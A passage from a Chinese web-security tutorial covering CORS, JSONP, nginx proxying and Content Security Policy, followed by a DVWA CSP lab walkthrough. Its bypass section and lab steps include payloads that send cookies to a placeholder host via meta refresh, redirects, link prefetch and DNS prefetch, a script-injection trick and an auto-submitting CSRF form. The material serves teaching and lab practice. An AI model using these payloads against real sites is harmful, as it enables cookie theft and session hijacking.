$(&#x27;body&#x27;).html(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>可以看到在请求中，我们填的是<code>PUT</code>，但是这里产生的却是<code>OPTIONS</code>，前面我们也说了，<code>非简单请求</code>会先产生一次<code>预检请求</code>，带上origin和真实的方法<code>在这里是PUT</code>，服务端验证通过了origin和方法之后，浏览器才会使用真实的方法<code>PUT</code>发送一次请求。</p><p>我们还没有在服务端返回头部告诉浏览器说我们支持PUT方法，所以浏览器这里拿不到权限，报错了。</p><p>我们在服务端的代码添加头部</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;</span>);</span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;</span>); <span class="comment">// 需要同意两种类型，就用逗号隔开</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;来自index2.php的内容&quot;</span>;</span><br></pre></td></tr></table></figure><p>到这里就可以正常的请求了，但是可以在浏览器中看到，产生了两次请求，也就是说php脚本执行了两次。</p><p>我们例子中只是简单输出一个字符，如果是查询数据库等操作呢？ 是不是就多出了一次无用的请求。</p><p>所以我们可以在服务端拦截预检请求，直接返回同意访问的头部，后面的脚本就不需要执行了。</p><p>还有前面的简单请求，哪怕是还没有添加信任，跨域请求失败，脚本也一样会运行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这是因为http协议并没有跨域的概念，请求发送了就会执行，而到达了浏览器的时候，才由浏览器解析响应头，查看是否有相应的字段来决定要不要继续执行。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 如果不是同意的来源 就不用运行了</span></span><br><span class="line"><span class="keyword">if</span> (strpos($_SERVER[<span class="string">&#x27;HTTP_ORIGIN&#x27;</span>], <span class="string">&#x27;http://www.siam.com&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&#x27;Access-Control-Allow-Origin:http://www.siam.com&#x27;</span>);</span><br><span class="line"><span class="comment">// 如果是预检请求，则通知信任即可，不需要执行脚本。</span></span><br><span class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&#x27;OPTIONS&#x27;</span>)&#123;</span><br><span class="line">    header(<span class="string">&#x27;Access-Control-Allow-Methods:PUT,DELETE&#x27;</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;来自index2.php的内容&quot;</span>;</span><br></pre></td></tr></table></figure><p>总的意思就是请求不是同意的来源以及请求是预检测我都不执行脚本</p><p>同时我们可以看一下，是否每一个<code>非简单请求</code>都需要先发送预检请求。我们在一个页面连续请求两次</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span><br><span class="line">    type: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">    success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).html(res);</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url : <span class="string">&quot;http://www.siam2.com/index2.php&quot;</span>,</span><br><span class="line">            type: <span class="string">&quot;PUT&quot;</span>,</span><br><span class="line">            success:<span class="function"><span class="keyword">function</span>(<span class="params">res</span>)</span>&#123;</span><br><span class="line">                $(<span class="string">&#x27;body&#x27;</span>).html(res);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>发现浏览器只有请求了3次：1次OPTIONS，2次PUT。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在一个页面中，预检操作只需要进行一次。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">优点</span><br><span class="line">CORS 通信与同源的 AJAX 通信没有差别，代码完全一样，容易维护。</span><br><span class="line">支持所有类型的 HTTP 请求。</span><br><span class="line">缺点</span><br><span class="line">第一次发送非简单请求时会多一次请求，增加服务器压力。</span><br></pre></td></tr></table></figure><h5 id="JSONP-跨域解决"><a href="#JSONP-跨域解决" class="headerlink" title="JSONP 跨域解决"></a>JSONP 跨域解决</h5><p>通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;http://steady.com/data.php?callback=steady&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">steady</span>(<span class="params">jsondata</span>)</span>&#123;</span><br><span class="line">        <span class="comment">//处理获得的json数据</span></span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>首先我们在html中写下以下代码，创建一个script，调用动态脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;ie=edge&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Siam - script 同源解决&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;这是原始页面的内容&lt;/h1&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.4.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">    <span class="comment">// 这里需要先写好相应的回调处理函数，然后服务端的脚本调用 传参</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">text</span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&#x27;body&#x27;</span>).append(text);</span><br><span class="line">    &#125;</span><br><span class="line">    $(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $(<span class="string">&quot;body&quot;</span>).append(<span class="string">&quot;&lt;script src=&#x27;http://www.siam2.com/script.php&#x27;&gt;&lt;\/script&gt;&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>服务端脚本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo &quot;test(&#39;这是返回内容&#39;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>优点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它不像XMLHttpRequest对象实现的Ajax请求那样受到同源策略的限制；它的兼容性更好，在更加古老的浏览器中都可以运行，不需要XMLHttpRequest或ActiveX的支持；并且在请求完毕后可以通过调用callback的方式回传结果。</span><br></pre></td></tr></table></figure><p>缺点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">它只支持&#96;GET&#96;请求而不支持POST等其它类型的HTTP请求；它只支持跨域HTTP请求这种情况，不能解决不同域的两个页面之间如何进行JavaScript调用的问题。</span><br></pre></td></tr></table></figure><h5 id="服务器代理"><a href="#服务器代理" class="headerlink" title="服务器代理"></a>服务器代理</h5><p>除了使用以上的两种方案，我们还可以在nginx配置反向代理，在<code>www.siam.com</code>下某个路径代理到<code>www.siam2.com</code>即可</p><p>我们打开nginx.conf</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  www.siam.com;</span><br><span class="line">    <span class="comment">#charset koi8-r;</span></span><br><span class="line">    <span class="comment">#access_log  logs/host.access.log  main;</span></span><br><span class="line">    <span class="attribute">location</span> / &#123;</span><br><span class="line">        <span class="attribute">root</span>   html;</span><br><span class="line">        <span class="attribute">index</span>  index.html index.htm;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="attribute">location</span><span class="regexp"> ^~</span> /apis &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://www.siam2.com;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过反向代理，我们就可以通过 <a href="https://links.jianshu.com/go?to=http://www.siam.com/apis/index2.php">www.siam.com/apis/index2.php</a> 这个路径来访问原来部署在<a href="https://links.jianshu.com/go?to=http://www.siam2.com">www.siam2.com</a>下的内容。<br> 这样子就是同源请求了。</p><h1 id="CSP"><a href="#CSP" class="headerlink" title="CSP"></a>CSP</h1><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>​    CSP全称Content Security Policy ,可以直接翻译为内容安全策略,为了页面内容安全而制定的一系列防护策略. 通过CSP所约束的的规则,指定可信的内容来源（这里的内容可以指脚本、图片、iframe、fton、style等等可能的远程的资源），明确告诉客户端，哪些外部资源可以加载和执行。通过CSP协定，让WEB处于一个安全的运行环境中。</p><h4 id="设置方式"><a href="#设置方式" class="headerlink" title="设置方式"></a>设置方式</h4><h5 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content-Security-Policy"></a>Content-Security-Policy</h5><p>一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;</span><br><span class="line">style-src cdn.example.org third-party.org; child-src https:</span><br></pre></td></tr></table></figure><h5 id="lt-meta-gt"><a href="#lt-meta-gt" class="headerlink" title="&lt;meta&gt;"></a>&lt;meta&gt;</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Security-Policy&quot;</span> content=<span class="string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>上面代码中，CSP 做了如下配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">脚本：只信任当前域名</span><br><span class="line">&lt;object&gt;标签：不信任任何URL，即不加载任何资源</span><br><span class="line">样式表：只信任cdn.example.org和third-party.org</span><br><span class="line">框架（frame）：必须使用HTTPS协议加载</span><br><span class="line">其他资源：没有限制</span><br></pre></td></tr></table></figure><h4 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h4><table><thead><tr><th>指令</th><th>说明</th></tr></thead><tbody><tr><td>default-src</td><td>定义资源默认加载策略</td></tr><tr><td>connect-src</td><td>定义 Ajax、WebSocket 等加载策略</td></tr><tr><td>font-src</td><td>定义 Font 加载策略</td></tr><tr><td>frame-src</td><td>定义 Frame 加载策略</td></tr><tr><td>img-src</td><td>定义图片加载策略</td></tr><tr><td>media-src</td><td>定义 &lt;audio&gt;、&lt;video&gt; 等引用资源加载策略</td></tr><tr><td>object-src</td><td>定义 &lt;applet&gt;、&lt;embed&gt;、&lt;object&gt; 等引用资源加载策略</td></tr><tr><td>script-src</td><td>定义 JS 加载策略</td></tr><tr><td>style-src</td><td>定义 CSS 加载策略</td></tr><tr><td>sandbox</td><td>值为 allow-forms，对资源启用 sandbox</td></tr><tr><td>report-uri</td><td>值为 /report-uri，提交日志</td></tr></tbody></table><h4 id="内容源"><a href="#内容源" class="headerlink" title="内容源"></a>内容源</h4><table><thead><tr><th>源</th><th>说明</th></tr></thead><tbody><tr><td>*</td><td>通配符，允许任何URL，除了data: blob: filesystem: schemes</td></tr><tr><td>*.<a href="http://foo.com/">foo.com</a></td><td>允许加载<a href="http://foo.com/">foo.com</a>子域的资源</td></tr><tr><td><a href="http://abc.foo.com/">abc.foo.com</a></td><td>只能加载这个域名下的资源</td></tr><tr><td><a href="https://a.com/">https://a.com</a></td><td>只能用HTTPS加载域名下的资源</td></tr><tr><td>https:</td><td>通过HTTPS可以加载任意域名下的资源</td></tr><tr><td>‘none’</td><td>代表空集,即不匹配任何URL,两侧单引号是必须的</td></tr><tr><td>‘self’</td><td>代表和文档同源,包括相同的URL协议和端口号,两侧单引号是必须的</td></tr><tr><td>‘unsafe-inline’</td><td>允许使用内联资源,如内联的&lt;script&gt;元素、javascript: URL、内联的事件处理函数和内联的&lt;style&gt;元素,两侧单引号是必须的</td></tr><tr><td>‘unsafe-eval’</td><td>允许使用 eval() 等通过字符串创建代码的方法,两侧单引号是必须的</td></tr><tr><td>data:</td><td>允许data: URI作为内容来源</td></tr><tr><td>mediastream:</td><td>允许mediastream: URI作为内容来源</td></tr></tbody></table><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39; steady.foo.com</span><br></pre></td></tr></table></figure><p>默认的内容源必须为同源或者是steady.foo.com</p><h4 id="nonce-script-CSP和strict-dynamic"><a href="#nonce-script-CSP和strict-dynamic" class="headerlink" title="nonce script CSP和strict-dynamic"></a>nonce script CSP和strict-dynamic</h4><h5 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Header(<span class="string">&quot;Content-Security-Policy: script-src &#x27;nonce-&quot;</span>.$random.<span class="string">&quot; &#x27;&quot;</span>);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;script nonce=<span class="string">&quot;&lt;?php echo $random?&gt;&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p><h5 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;strict-dynamic&#39;</span><br></pre></td></tr></table></figure><h4 id="CSP-Bypass的方法总结"><a href="#CSP-Bypass的方法总结" class="headerlink" title="CSP Bypass的方法总结"></a>CSP Bypass的方法总结</h4><p>CSP对前端攻击的防御主要有两个：</p><ol><li>限制js的执行。</li><li>限制对不可信域的请求。</li></ol><h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><h6 id="url跳转"><a href="#url跳转" class="headerlink" title="url跳转"></a>url跳转</h6><p>在default-src ‘none‘的情况下，可以使用meta标签实现跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv&#x3D;&quot;refresh&quot; content&#x3D;&quot;1;url&#x3D;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot; &gt;</span><br></pre></td></tr></table></figure><p>在允许unsafe-inline的情况下</p><ul><li><p>用window.location，或者window.open之类的方法进行跳转绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  window.location&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure></li><li><p>&lt;a&gt;标签配合站内的某些可控JS点击操作来跳转</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  $(#foo).click()</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;a id&#x3D;&quot;foo&quot; href&#x3D;&quot;xxxxx.com&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>利用网站本身的跳转接口</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;foo.com&#x2F;jmp.php?url&#x3D;attack.com</span><br></pre></td></tr></table></figure></li></ul><h6 id="lt-link-gt-标签预加载"><a href="#lt-link-gt-标签预加载" class="headerlink" title="&lt;link&gt;标签预加载"></a>&lt;link&gt;标签预加载</h6><p>CSP对link标签的预加载功能考虑不完善。在Chrome下，可以使用如下标签发送cookie或者其他数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;prefetch&quot; href&#x3D;&quot;http:&#x2F;&#x2F;www.steady.com&#x2F;x.php?c&#x3D;[cookie]&quot;&gt;</span><br></pre></td></tr></table></figure><p>在Firefox下无法用prefetch，因为Firefox有更高的安全规范，但是我们可以使用其他的方式，比如dns-prefetch，将cookie作为子域名，用dns预解析的方式把cookie带出去，查看dns服务器的日志就能得到cookie</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel&#x3D;&quot;dns-prefetch&quot; href&#x3D;&quot;&#x2F;&#x2F;[cookie].xxx.ceye.io&quot;&gt;</span><br></pre></td></tr></table></figure><h6 id="利用浏览器补全"><a href="#利用浏览器补全" class="headerlink" title="利用浏览器补全"></a>利用浏览器补全</h6><p>有些网站限制只有某些脚本才能使用，往往会使用&lt;script&gt;标签的nonce属性，只有nonce一致的脚本才生效，比如CSP设置成下面这样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#39;none&#39;;script-src &#39;nonce-abc&#39;</span><br></pre></td></tr></table></figure><p>插入点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;插入点&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;</span><br></pre></td></tr></table></figure><p>浏览器的容错机制会拼成一个新的script标签，其中的src可以自由设定</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;&lt;script src&#x3D;&#x2F;&#x2F;attack.com a&#x3D;&quot;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;script&quot; nonce&#x3D;&quot;abc&quot;&gt;document.write(&#39;CSP&#39;);&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><h1 id="DVWA-CSP靶场"><a href="#DVWA-CSP靶场" class="headerlink" title="DVWA-CSP靶场"></a>DVWA-CSP靶场</h1><h4 id="src属性"><a href="#src属性" class="headerlink" title="src属性"></a>src属性</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;myscripts.js&quot;&gt;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>src 属性规定外部脚本文件的 URL。</p><p>有时，我们需要在网站的多个页面中运行 JavaScript。不需要重复编写相同的脚本，只需在单独的文件中创建 JavaScript，并以 .js 为后缀保存，然后使用&lt;script&gt; 标签中的 src 属性引用该文件即可。</p><p><strong>注释：</strong>外部文件不能包含 &lt;script&gt; 标签！</p><h4 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h4><p>源码分析</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//定义script脚本执行策略，可以看到只允许本域、以及一下网站</span></span><br><span class="line">https:<span class="comment">//pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;</span>; <span class="comment">// allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span></span><br><span class="line"><span class="comment">//设置CSP头</span></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://hastebin.com/raw/ohulaquzex</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//接受include参数</span></span><br><span class="line"><span class="keyword">if</span> (isset ($_POST[<span class="string">&#x27;include&#x27;</span>])) &#123;</span><br><span class="line"><span class="comment">//拼接参数</span></span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;script src=&#x27;&quot;</span> . $_POST[<span class="string">&#x27;include&#x27;</span>] . <span class="string">&quot;&#x27;&gt;&lt;/script&gt;</span></span><br><span class="line"><span class="string">&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$page[ <span class="string">&#x27;body&#x27;</span> ] .= <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span></span><br><span class="line"><span class="string">&lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&#x27;</span>;</span><br></pre></td></tr></table></figure><p>构造payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;pastebin.com&#x2F;raw&#x2F;jWN8HLKe</span><br></pre></td></tr></table></figure><p><code>https://pastebin.com</code>是一个快速文本分享网站，我们可以插入我们的xss代码。</p><p>配合CSRF，诱惑用户自动触发漏洞。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=<span class="string">&quot;csp&quot;</span> name=<span class="string">&quot;csp&quot;</span> method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;http://192.168.1.200/DVWA-master/vulnerabilities/csp/&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;input size=<span class="string">&quot;50&quot;</span> type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;include&quot;</span> value=<span class="string">&quot;&quot;</span> id=<span class="string">&quot;include&quot;</span>&gt;</span><br><span class="line"> </span><br><span class="line">&lt;script&gt;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">var</span> cspb = <span class="built_in">document</span>.getElementById(<span class="string">&quot;csp&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  cspb[<span class="number">0</span>].value=<span class="string">&quot;https://pastebin.com/raw/rcBeKDgL&quot;</span>;</span><br><span class="line"> </span><br><span class="line">  cspb.submit();</span><br><span class="line"> </span><br><span class="line">&lt;/script&gt;</span><br><span class="line"> </span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><h4 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h4><p>源码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="comment">//js脚本只允许本域、允许使用内联资源、而且设置了nonce属性</span></span><br><span class="line">$headerCSP = <span class="string">&quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;</span>;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Disable XSS protections so that inline alert boxes will work</span></span><br><span class="line">header (<span class="string">&quot;X-XSS-Protection: 0&quot;</span>);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span 